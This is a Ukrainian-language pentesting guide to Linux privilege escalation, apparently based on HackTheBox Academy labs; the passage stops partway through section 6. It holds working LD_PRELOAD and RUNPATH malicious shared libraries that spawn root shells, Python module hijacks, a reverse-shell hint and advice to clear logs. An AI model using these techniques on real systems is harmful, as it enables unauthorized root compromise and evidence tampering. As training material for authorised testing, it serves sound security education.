# Linux Privilege Escalation — практичний гайд пентестера

> На основі матеріалів HackTheBox Academy • з розширеним розділом перерахування • з описом очікуваних оутпутів і прикладами

---

## 📑 Зміст

1. [Вступ і методологія](#1-вступ-і-методологія)
2. [Перерахування — зведений чекліст](#2-перерахування--зведений-чекліст)
3. [Експлуатація ядра (Kernel Exploits)](#3-експлуатація-ядра-kernel-exploits)
4. [Shared Libraries і LD_PRELOAD](#4-shared-libraries-і-ld_preload)
5. [Shared Object Hijacking (RUNPATH)](#5-shared-object-hijacking-runpath)
6. [Python Library Hijacking](#6-python-library-hijacking)
7. [Sudo: CVE-2021-3156 + CVE-2019-14287](#7-sudo-cve-2021-3156--cve-2019-14287)
8. [Polkit / PwnKit (CVE-2021-4034)](#8-polkit--pwnkit-cve-2021-4034)
9. [Dirty Pipe (CVE-2022-0847)](#9-dirty-pipe-cve-2022-0847)
10. [Netfilter: CVE-2021-22555 / CVE-2022-25636 / CVE-2023-32233](#10-netfilter-cve-2021-22555--cve-2022-25636--cve-2023-32233)
11. [Підсумкова шпаргалка](#11-підсумкова-шпаргалка)

---

## Позначки у документі

- 🔍 **ПОШУК:** — що треба шукати в оутпуті
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** — як має виглядати результат
- ⏳ **ОЧІКУВАННЯ:** — команда виконується довго, треба чекати
- 🔗 **ЕКСПЛУАТАЦІЯ:** — посилання на розділ з експлуатацією
- ⚠️ **УВАГА** — попередження про можливі наслідки
- 📝 **ПРИМІТКА** — додаткова інформація

---

# 1. Вступ і методологія

Підвищення привілеїв (Privilege Escalation, privesc) на Linux — це перехід від обмеженого користувача до **root** або іншого привілейованого облікового запису. Успіх тут на 80% складається з якісного перерахування (enumeration). Чим більше інформації про систему зібрано, тим більше векторів виявляється.

## Алгоритм роботи

1. **Перерахування** — зібрати якомога більше інформації про систему, ядро, права, sudo, SUID, cron, capabilities, бібліотеки, процеси, мережу.
2. **Аналіз** — зіставити знайдене з відомими вразливостями та misconfigurations. Основні категорії: застаріле ядро, вразливий sudo/polkit, неправильні права на бібліотеки/скрипти, SUID-бінарі, hijacking.
3. **Експлуатація** — запустити експлойт або здійснити hijacking.
4. **Post-exploitation** — закріпитися, прибрати сліди (зачистка `/tmp`, логів).

## Як читати цей документ

У розділі **«Перерахування»** зібрані всі команди з усіх тематичних розділів в одному місці у вигляді чекліста. Біля кожної команди — опис, що шукати, приклад оутпуту та посилання на розділ з експлуатацією. Якщо команда довго виконується — це позначено окремо.

У **тематичних розділах** — детальний опис експлуатації кожного вектору з прикладами коду і очікуваними результатами.

> ⚠️ **УВАГА.** Експлойти ядра та експлойти Netfilter можуть викликати нестабільність, kernel panic або зависання системи. На продакшн-середовищах запускати тільки з письмового дозволу клієнта і, якщо можливо, на клоні системи. Обов'язково робити знімок VM.

---

# 2. Перерахування — зведений чекліст

Цей розділ містить **усі команди перерахування** з усього матеріалу, згруповані за категоріями. Кожна команда супроводжується описом того, що треба шукати в оутпуті, прикладом типового виводу, та посиланням на розділ експлуатації.

> 📝 **Рекомендація:** спочатку пройти весь цей чекліст зверху вниз, записувати всі підозрілі знахідки, і лише потім переходити до експлуатації відповідних векторів. Часто вразливостей кілька, і варто вибрати найбільш надійну.

## 2.1. Інформація про систему та ядро

### Перевірка версії ядра

```bash
uname -a
```

- 🔍 **ПОШУК:** версія ядра (напр. 4.4.0-116), архітектура (x86_64).
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** рядок виду `Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP ... x86_64`.

```
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** якщо ядро 5.8-5.17 — див. [Розділ 9](#9-dirty-pipe-cve-2022-0847) (Dirty Pipe); 2.6-5.11 — [Розділ 10](#101-cve-2021-22555) (CVE-2021-22555); 5.4-5.6.10 — [Розділ 10](#102-cve-2022-25636) (CVE-2022-25636); до 6.3.1 — [Розділ 10](#103-cve-2023-32233) (CVE-2023-32233); будь-яке застаріле — [Розділ 3](#3-експлуатація-ядра-kernel-exploits) (Kernel Exploits).

---

```bash
uname -r
```

- 🔍 **ПОШУК:** тільки версію ядра — зручно для швидкого пошуку CVE.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** коротко.

```
5.13.0-46-generic
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** див. Розділи 3, 9, 10.

### Версія та дистрибутив ОС

```bash
cat /etc/lsb-release
```

- 🔍 **ПОШУК:** дистрибутив, реліз, кодове ім'я (важливо для підбору PoC до конкретної версії).
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** 4 рядки з DISTRIB_ID, DISTRIB_RELEASE, DISTRIB_CODENAME, DISTRIB_DESCRIPTION.

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=20.04
DISTRIB_CODENAME=focal
DISTRIB_DESCRIPTION="Ubuntu 20.04.1 LTS"
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** Розділи 3, 7 — кожен PoC зазвичай скомпільований під конкретну ОС.

## 2.2. Перевірка прав sudo

### Права поточного користувача

```bash
sudo -l
```

- 🔍 **ПОШУК:** що саме користувач може запускати через sudo; наявність `NOPASSWD`; `env_keep+=LD_PRELOAD`; `SETENV:` flag; дозволи типу `(ALL) /usr/bin/command`.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** перелік команд з правами sudo для користувача.

```
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:...,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** `env_keep+=LD_PRELOAD` → [Розділ 4](#4-shared-libraries-і-ld_preload); `SETENV` + Python → [Розділ 6.3](#63-pythonpath-environment-variable); дозвіл на конкретну команду з `(ALL)` → [Розділ 7.3](#73-cve-2019-14287-sudo-policy-bypass) (трюк `-u#-1`).

### Перегляд /etc/sudoers

```bash
sudo cat /etc/sudoers | grep -v "#" | sed -r '/^\s*$/d'
```

- 🔍 **ПОШУК:** нестандартні записи, `Defaults env_keep`, записи `%group`, користувачів з `(ALL)`, `NOPASSWD`.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** всі активні (не закоментовані) правила sudoers.

```
Defaults        env_reset
Defaults        mail_badpass
Defaults        secure_path="/usr/local/sbin:/usr/local/bin:..."
Defaults        use_pty
root            ALL=(ALL:ALL) ALL
%admin          ALL=(ALL) ALL
%sudo           ALL=(ALL:ALL) ALL
cry0l1t3        ALL=(ALL) /usr/bin/id
@includedir     /etc/sudoers.d
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 7](#7-sudo-cve-2021-3156--cve-2019-14287).

### Версія sudo (для перевірки на Baron Samedit)

```bash
sudo -V | head -n1
```

- 🔍 **ПОШУК:** версію sudo. Вразливі: `1.8.31` (Ubuntu 20.04), `1.8.27` (Debian 10), `1.9.2` (Fedora 33); `<1.8.28` — вразливий до CVE-2019-14287.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** один рядок: `Sudo version X.Y.ZZ`.

```
Sudo version 1.8.31
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 7](#7-sudo-cve-2021-3156--cve-2019-14287).

## 2.3. SUID / SGID бінарі

### Пошук усіх SUID-бінарів

```bash
find / -perm -4000 2>/dev/null
```

- ⏳ **ОЧІКУВАННЯ:** команда обходить всю файлову систему — може виконуватися десятки секунд на великих системах. Чекай і не перериай.
- 🔍 **ПОШУК:** нестандартні або кастомні бінарі (не з базового дистрибутиву), а також доречні для Dirty Pipe: `/usr/bin/sudo`, `/usr/bin/passwd` тощо.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** список абсолютних шляхів до SUID-бінарів.

```
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 9](#9-dirty-pipe-cve-2022-0847) (Dirty Pipe — можна hijack-ити будь-який SUID-binary); [Розділ 5](#5-shared-object-hijacking-runpath) (Shared Object Hijacking кастомних SUID-бінарів); [Розділ 8](#8-polkit--pwnkit-cve-2021-4034) (якщо є pkexec — можливий PwnKit).

### Перевірка прав конкретного SUID-бінара

```bash
ls -la payroll
```

- 🔍 **ПОШУК:** SUID-біт (`s` замість `x` у полі власника), власника root.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** типовий `-rwsr-xr-x` — літера `s` у власника означає SUID.

```
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 5](#5-shared-object-hijacking-runpath).

## 2.4. Спільні бібліотеки та їх шляхи

### Перелік залежностей бінара

```bash
ldd /bin/ls
```

- 🔍 **ПОШУК:** бібліотеки з нестандартних шляхів (не `/lib`, не `/usr/lib`, а напр. `/development/`, `/opt/`, `/home/`); відсутні бібліотеки.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** список `.so` файлів з їх абсолютними шляхами та адресами в пам'яті.

```
linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділи 4](#4-shared-libraries-і-ld_preload) і [5](#5-shared-object-hijacking-runpath).

### Перевірка залежностей кастомного SUID-бінара

```bash
ldd payroll
```

- 🔍 **ПОШУК:** нестандартні бібліотеки на кшталт `libshared.so` з `/development/`, `/opt/`...
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** схожий список, але з бібліотеками з незвичних тек.

```
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 5](#5-shared-object-hijacking-runpath) (Shared Object Hijacking).

### Перевірка RUNPATH/RPATH у бінарі

```bash
readelf -d payroll  | grep PATH
```

- 🔍 **ПОШУК:** рядки `RUNPATH` або `RPATH` з шляхом до директорії.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** рядок з `Library runpath: [/some/path]`.

```
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 5](#5-shared-object-hijacking-runpath).

### Чи можна писати в RUNPATH-теку

```bash
ls -la /development/
```

- 🔍 **ПОШУК:** права `drwxrwxrwx` або наявність `w` для групи/others на теці.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** якщо `drwxrwxrwx` — можна підмінити бібліотеку.

```
total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 5](#5-shared-object-hijacking-runpath).

## 2.5. Python-скрипти з SUID/sudo

### Аналіз конкретного Python-скрипта

```bash
ls -l mem_status.py
```

- 🔍 **ПОШУК:** SUID-біт (`rwsrwxr-x`), власник root.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** рядок із `s` у полі прав власника.

```
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6](#6-python-library-hijacking).

### Пошук функції, яку імпортує скрипт, у модулі

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

- 🔍 **ПОШУК:** шляхи до файлів модуля, де визначено функцію.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** список файлів з визначеннями функції у різних платформенних модулях.

```
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
... (інші платформи)
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6](#6-python-library-hijacking).

### Перевірка прав запису на файл модуля

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

- 🔍 **ПОШУК:** наявність `w` для users/others: `-rw-r--rw-` = кожен може писати.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** шлях + права.

```
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6.1](#61-wrong-write-permissions) (Wrong Write Permissions).

### Вивід PYTHONPATH (порядок пошуку модулів)

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

- 🔍 **ПОШУК:** шляхи з високим пріоритетом (перші рядки) де ми маємо права запису; чи знаходиться цільовий модуль у теці з нижчим пріоритетом.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** список шляхів у порядку пріоритету.

```
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6.2](#62-library-path) (Library Path).

### Де встановлено конкретний модуль

```bash
pip3 show psutil
```

- 🔍 **ПОШУК:** поле `Location:` — де саме лежить модуль.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** метадані пакета, включно з локацією.

```
Location: /usr/local/lib/python3.8/dist-packages
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6.2](#62-library-path).

### Перевірка прав на теки з PYTHONPATH

```bash
ls -la /usr/lib/python3.8
```

- 🔍 **ПОШУК:** `drwxr-xrwx` або подібне — writable для others.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** вміст теки з правами.

```
total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 6.2](#62-library-path).

## 2.6. Polkit / pkexec

### Тест на привілеї через pkexec

```bash
pkexec -u root id
```

- 🔍 **ПОШУК:** якщо команда запустилась без пароля або PolKit дозволяє — маркер misconfiguration.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** `id` з `uid=0` у разі успіху.

```
uid=0(root) gid=0(root) groups=0(root)
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 8](#8-polkit--pwnkit-cve-2021-4034) (перевірка версії pkexec на PwnKit у будь-якому випадку).

## 2.7. Підтвердження отриманих привілеїв

### Перевірка поточного користувача

```bash
whoami
```

- 🔍 **ПОШУК:** просто ім'я користувача. Після експлойту — `root`.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** одне слово.

```
root
```

```bash
id
```

- 🔍 **ПОШУК:** `uid=0(root) gid=0(root) groups=0(root)` — повний успіх.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** детальний опис UID/GID + групи.

```
uid=0(root) gid=0(root) groups=0(root)
```

### Перевірка конкретного користувача в /etc/passwd

```bash
cat /etc/passwd | grep cry0l1t3
```

- 🔍 **ПОШУК:** UID користувача (третє поле).
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** стандартний рядок passwd.

```
cry0l1t3:x:1005:1005:cry0l1t3,,,:/home/cry0l1t3:/bin/bash
```

- 🔗 **ЕКСПЛУАТАЦІЯ:** [Розділ 7.3](#73-cve-2019-14287-sudo-policy-bypass) (CVE-2019-14287).

---

# 3. Експлуатація ядра (Kernel Exploits)

Експлойти рівня ядра існують для багатьох версій Linux. Класичний приклад — **Dirty COW (CVE-2016-5195)**. Вони використовують вразливості в ядрі для виконання коду від імені root. Часто можна зустріти системи, вразливі до експлойтів ядра, тому що застарілі системи складно патчити — деякі сервіси або додатки можуть не працювати на новіших ядрах.

Ескалація через kernel exploit зазвичай зводиться до: завантажити, скомпілювати, запустити. Деякі PoC працюють з коробки, деякі треба правити.

> ⚠️ **УВАГА.** Експлойти ядра можуть викликати нестабільність системи. Запускати обережно, особливо на продакшні.

## Крок 1. Перевірка версії ядра та ОС

```bash
uname -a
```

- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** повна інформація про ядро.

```
Linux NIX02 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
```

- 🔍 **ПОШУК:** версію ядра (4.4.0-116) і архітектуру (x86_64).

```bash
cat /etc/lsb-release
```

- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** дистрибутив + реліз.

```
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04.4 LTS"
```

У прикладі — Linux Kernel **4.4.0-116** на Ubuntu **16.04.4 LTS**. Швидкий Google-пошук за запитом *"linux 4.4.0-116-generic exploit"* дає PoC. Завантажити на цільову систему через `wget` або іншим способом.

## Крок 2. Компіляція експлойта

```bash
gcc kernel_exploit.c -o kernel_exploit && chmod +x kernel_exploit
```

- 🔍 **ПОШУК:** відсутність помилок компіляції; створення файлу `kernel_exploit`.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** зазвичай мовчазний вивід у разі успіху.

## Крок 3. Запуск

```bash
./kernel_exploit
```

- 🔍 **ПОШУК:** повідомлення від PoC про успіх (`spawning root shell` тощо).
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** повідомлення від PoC, потім — root-shell.

```
task_struct = ffff8800b71d7000
uidptr = ffff8800b95ce544
spawning root shell
```

## Крок 4. Підтвердження

```bash
whoami
```

```
root
```

> 📝 **ПРИМІТКА.** Якщо цільова система оновлена, але все ще вразлива — шукай kernel exploit 2021+ року. Список перевірених CVE: Dirty COW (2016), Dirty Pipe (2022), CVE-2021-22555 і далі — див. [Розділ 9](#9-dirty-pipe-cve-2022-0847) і [10](#10-netfilter-cve-2021-22555--cve-2022-25636--cve-2023-32233).

---

# 4. Shared Libraries і LD_PRELOAD

Програми Linux зазвичай використовують динамічно пов'язані спільні об'єктні бібліотеки. В Linux є два типи:

- **Статичні** (`.a`) — стають частиною бінара при компіляції і не змінюються.
- **Динамічні** (`.so`) — можуть бути змінені, що дозволяє контролювати виконання програми, яка їх викликає.

Шляхи, де система шукає бібліотеки: прапори `-rpath` / `-rpath-link` при компіляції, змінні `LD_RUN_PATH` / `LD_LIBRARY_PATH`, типові теки `/lib` і `/usr/lib`, конфіг `/etc/ld.so.conf`.

Крім того, змінна **LD_PRELOAD** дозволяє завантажити довільну бібліотеку *перед* виконанням бінара. Функції з цієї бібліотеки отримують пріоритет над типовими.

## Перевірка залежностей програми

```bash
ldd /bin/ls
```

```
linux-vdso.so.1 =>  (0x00007fff03bc7000)
libselinux.so.1 => /lib/x86_64-linux-gnu/libselinux.so.1 (0x00007f4186288000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f4185ebe000)
libpcre.so.3 => /lib/x86_64-linux-gnu/libpcre.so.3 (0x00007f4185c4e000)
libdl.so.2 => /lib/x86_64-linux-gnu/libdl.so.2 (0x00007f4185a4a000)
/lib64/ld-linux-x86-64.so.2 (0x00007f41864aa000)
libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f418582d000)
```

- 🔍 **ПОШУК:** усі бібліотеки, потрібні бінару, та їх абсолютні шляхи.

## LD_PRELOAD Privilege Escalation

Атака працює, якщо:
1. У користувача є sudo-право на якусь команду
2. У `/etc/sudoers` стоїть `env_keep+=LD_PRELOAD` (зберігати цю змінну при виклику sudo)

### Крок 1. Перевірити права sudo

```bash
sudo -l
```

```
Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:...,
    env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart
```

- 🔍 **ПОШУК:** наявність **`env_keep+=LD_PRELOAD`** та дозволеної команди (навіть якщо вона не в GTFOBins).

### Крок 2. Написати шкідливу бібліотеку (root.c)

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Функція `_init()` викликається автоматично при завантаженні бібліотеки. `unsetenv("LD_PRELOAD")` потрібен, щоб уникнути рекурсії при виклику `/bin/bash`.

### Крок 3. Скомпілювати

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
```

- 🔍 **ПОШУК:** відсутність помилок; створення `root.so`.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** мовчазний вивід.

### Крок 4. Запустити sudo з підробленим LD_PRELOAD

```bash
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

- 🔍 **ПОШУК:** отримання root-шелу.
- 📄 **ОЧІКУВАНИЙ ОУТПУТ:** інтерактивний shell від root.

```
id
uid=0(root) gid=0(root) groups=0(root)
```

> 📝 **ПРИМІТКА.** Обов'язково вказуй абсолютний шлях до `.so` файлу. Відносні шляхи sudo не пропустить.

---

# 5. Shared Object Hijacking (RUNPATH)

Програми і бінарі в стадії розробки часто мають пов'язані кастомні бібліотеки. Якщо такий SUID-binary посилається на бібліотеку з нестандартного шляху (RUNPATH), а теку RUNPATH можемо записувати — ми можемо підмінити бібліотеку.

## Крок 1. Знайти SUID-бінар

```bash
ls -la payroll
```

```
-rwsr-xr-x 1 root root 16728 Sep  1 22:05 payroll
```

- 🔍 **ПОШУК:** літеру `s` у полі власника = SUID біт.

## Крок 2. Переглянути залежності

```bash
ldd payroll
```

```
linux-vdso.so.1 =>  (0x00007ffcb3133000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
/lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

- 🔍 **ПОШУК:** нестандартну бібліотеку (тут: **`libshared.so` з `/development/`**).

## Крок 3. Перевірити RUNPATH

```bash
readelf -d payroll  | grep PATH
```

```
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

- 🔍 **ПОШУК:** запис `RUNPATH` з шляхом, який перевіряється першим (пріоритетніше за системні теки).

## Крок 4. Перевірити права на RUNPATH-теку

```bash
ls -la /development/
```

```
total 8
drwxrwxrwx  2 root root 4096 Sep  1 22:06 ./
drwxr-xr-x 23 root root 4096 Sep  1 21:26 ../
```

- 🔍 **ПОШУК:** `drwxrwxrwx` — тека writable для всіх. Саме ця комбінація (writable RUNPATH + SUID bin) і дає ескалацію.

## Крок 5. Знайти назву функції, яку викликає бінар

Спочатку ще раз `ldd payroll`:

```bash
ldd payroll
```

```
linux-vdso.so.1 (0x00007ffd22bbc000)
libshared.so => /development/libshared.so (0x00007f0c13112000)
/lib64/ld-linux-x86-64.so.2 (0x00007f0c1330a000)
```

Підмінити бібліотеку реплікою libc, щоб побачити, яка функція "відсутня":

```bash
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so
```

```bash
./payroll
```

```
./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

- 🔍 **ПОШУК:** ім'я `undefined symbol` — саме цю функцію треба реалізувати в підробленій бібліотеці.

## Крок 6. Написати підроблену бібліотеку (src.c)

```c
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
}
```

Функція `dbquery` встановлює UID у 0 (root) і запускає `/bin/sh -p` (прапор `-p` зберігає привілеї).

## Крок 7. Скомпілювати прямо в RUNPATH-теку

```bash
gcc src.c -fPIC -shared -o /development/libshared.so
```

## Крок 8. Запустити SUID-бінар

```bash
./payroll
```

```
***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

- 🔍 **ПОШУК:** `uid=0(root)` — ескалація вдалася.

---

# 6. Python Library Hijacking

Python — одна з найпопулярніших мов, і в корпоративних середовищах часто зустрічаються Python-скрипти з SUID/sudo-правами. **Три основні вектори hijacking:**

1. **Wrong Write Permissions** — можна писати в сам модуль Python.
2. **Library Path** — цільовий модуль у теці з низьким пріоритетом, а в теку з високим — можемо писати.
3. **PYTHONPATH** — sudoers дозволяє встановлювати env-змінні.

## 6.1. Wrong Write Permissions

### Крок 1. Перевірити права на SUID-скрипт

```bash
ls -l mem_status.py
```

```
-rwsrwxr-x 1 root mrb3n 188 Dec 13 20:13 mem_status.py
```

- 🔍 **ПОШУК:** SUID-біт (`s`) на скрипті, що запускається від root.

### Крок 2. Прочитати скрипт

Приклад вмісту `mem_status.py`:

```python
#!/usr/bin/env python3
import psutil

available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total

print(f"Available memory: {round(available_memory, 2)}%")
```

- 🔍 **ПОШУК:** які модулі імпортує скрипт і які функції викликає. Тут: `psutil.virtual_memory()`.

### Крок 3. Знайти визначення функції в модулі

```bash
grep -r "def virtual_memory" /usr/local/lib/python3.8/dist-packages/psutil/*
```

```
/usr/local/lib/python3.8/dist-packages/psutil/__init__.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psaix.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psbsd.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pslinux.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_psosx.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pssunos.py:def virtual_memory():
/usr/local/lib/python3.8/dist-packages/psutil/_pswindows.py:def virtual_memory():
```

### Крок 4. Перевірити права на файл модуля

```bash
ls -l /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

```
-rw-r--rw- 1 root staff 87339 Dec 13 20:07 /usr/local/lib/python3.8/dist-packages/psutil/__init__.py
```

- 🔍 **ПОШУК:** **`-rw-r--rw-`** — `w` для others, тобто ми можемо модифікувати файл модуля.

### Крок 5. Впровадити payload у функцію virtual_memory()

Додаємо на початок функції:

```python
def virtual_memory():
    ...SNIP...
    #### Hijacking
    import os
    os.system('id')

    global _TOTAL_PHYMEM
    ret = _psplatform.virtual_memory()
    _TOTAL_PHYMEM = ret.total
    return ret
    ...SNIP...
```

### Крок 6. Запустити скрипт через sudo

```bash
sudo /usr/bin/python3 ./mem_status.py
```

```
uid=0(root) gid=0(root) groups=0(root)
uid=0(root) gid=0(root) groups=0(root)
Available memory: 79.22%
```

- 🔍 **ПОШУК:** два виклики `id` (звідти двічі виводиться `uid=0`); ескалація успішна.

> 📝 **ПРИМІТКА.** Після першого тесту замінити `os.system("id")` на reverse shell, який з'єднається з нашим хостом від імені root.

## 6.2. Library Path

В Python у кожній версії є визначений порядок пошуку модулів. Шляхи з початку списку мають вищий пріоритет. Якщо модуль встановлено у теці з нижчим пріоритетом, а в якусь теку з вищим ми можемо писати — підміняємо модуль.

### Крок 1. Вивести порядок пошуку

```bash
python3 -c 'import sys; print("\n".join(sys.path))'
```

```
/usr/lib/python38.zip
/usr/lib/python3.8
/usr/lib/python3.8/lib-dynload
/usr/local/lib/python3.8/dist-packages
/usr/lib/python3/dist-packages
```

### Крок 2. Знайти, де фізично лежить цільовий модуль

```bash
pip3 show psutil
```

```
...SNIP...
Location: /usr/local/lib/python3.8/dist-packages
...SNIP...
```

- 🔍 **ПОШУК:** поле `Location` — звідки реально імпортується модуль.

### Крок 3. Перевірити права на теки вищого пріоритету

```bash
ls -la /usr/lib/python3.8
```

```
total 4916
drwxr-xrwx 30 root root  20480 Dec 14 16:26 .
...SNIP...
```

- 🔍 **ПОШУК:** `drwxr-xrwx` — тека writable для others. Вона вища за пріоритетом за `/usr/local/lib/python3.8/dist-packages` (де стоїть psutil).

### Крок 4. Створити підроблений psutil.py у теці з вищим пріоритетом

```python
#!/usr/bin/env python3

import os

def virtual_memory():
    os.system('id')
```

Шлях: `/usr/lib/python3.8/psutil.py`. Ім'я модуля і сигнатура функції мають збігатися з оригіналом.

### Крок 5. Запустити скрипт

```bash
sudo /usr/bin/python3 mem_status.py
```

```
uid=0(root) gid=0(root) groups=0(root)
Traceback (most recent call last):
  File "mem_status.py", line 4, in <module>
    available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
AttributeError: 'NoneType' object has no attribute 'available'
```

